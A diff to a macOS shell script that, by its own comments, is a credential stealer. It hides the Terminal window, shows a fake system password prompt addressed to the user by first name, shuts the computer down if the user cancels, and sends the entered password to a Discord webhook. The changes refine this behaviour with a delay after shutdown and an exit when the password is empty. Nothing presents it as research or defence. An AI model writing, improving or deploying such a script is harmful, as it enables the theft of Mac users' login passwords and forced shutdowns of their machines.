@@ -6,9 +6,6 @@
 #
 # If the user presses cancel, the system will shut down
 # If a password is entered, it sends the captured data to a Discord webhook
-#
-# Requirements:
-# - macOS with osascript, curl, and either python3 or python installed.
 
 # Hide Terminal immediately.
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -19,7 +16,7 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 # Initialize capture text.
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
 
-# Define AppleScript for a persistent password prompt with a two-line message.
+# Define AppleScript for password prompt with shutdown on cancel
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -30,6 +27,7 @@ try
     return userPassword
 on error
     do shell script "osascript -e 'tell app \"System Events\" to shut down'"
+    delay 1
     return "CANCEL_SHUTDOWN_INITIATED"
 end try
 EOF
@@ -39,6 +37,11 @@ userPassword=$(osascript -e "$applescriptCode")
 
 # Check if shutdown was initiated
 if [[ "$userPassword" == "CANCEL_SHUTDOWN_INITIATED" ]]; then
+    exit 0
+fi
+
+# Check if password is empty - in that case exit without continuing
+if [[ -z "$userPassword" ]]; then
     exit 0
 fi
 
